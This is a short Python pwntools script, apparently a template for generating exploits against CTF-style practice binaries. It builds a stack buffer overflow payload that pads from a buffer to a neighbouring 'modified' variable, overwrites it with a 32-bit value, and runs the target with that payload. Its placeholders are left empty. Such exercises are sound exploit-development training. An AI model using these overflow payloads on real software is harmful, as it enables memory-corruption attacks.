from pwn import *

gen_filename = ""
gen_names = {}
gen_templates = {}
gen_var_locations = {}

e = ELF(gen_filename)

buff = gen_names["buffer"]
mod = gen_names["modified"]

payload = b""
payload += (gen_var_locations[mod][-1] - gen_var_locations[buff][-1]) * b"a"
payload += p32(gen_templates["X"])

p = e.process([payload])

print(p.recvlineS())
